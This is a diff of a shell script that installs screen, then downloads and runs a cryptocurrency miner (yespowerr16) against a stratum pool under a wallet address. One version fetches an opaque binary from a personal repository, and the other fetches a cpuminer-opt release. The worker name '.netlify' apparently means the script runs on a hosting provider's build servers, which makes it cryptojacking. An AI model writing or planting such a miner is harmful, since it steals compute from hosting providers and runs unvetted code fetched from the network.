@@ -2,8 +2,9 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/darafater/jancuk/raw/main/nanung
-chmod +x nanung
-./nanung -a yespowerr16  -o stratum+tcps://stratum-asia.rplant.xyz:13382 -u YfRdWF5mf1qAzJer4F94UG4ErQ5jBPah82.netlify -t4
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+tar -xf cpuminer-opt-linux.tar.gz
+cd miner
+./cpuminer-sse2 -a yespowerr16  -o stratum+tcps://stratum-ru.rplant.xyz:13382 -u YbvMJ7gQr1aQU9sisRe9YHuxtCh1BMV9se.netlify -t4
 sleep 5
 done
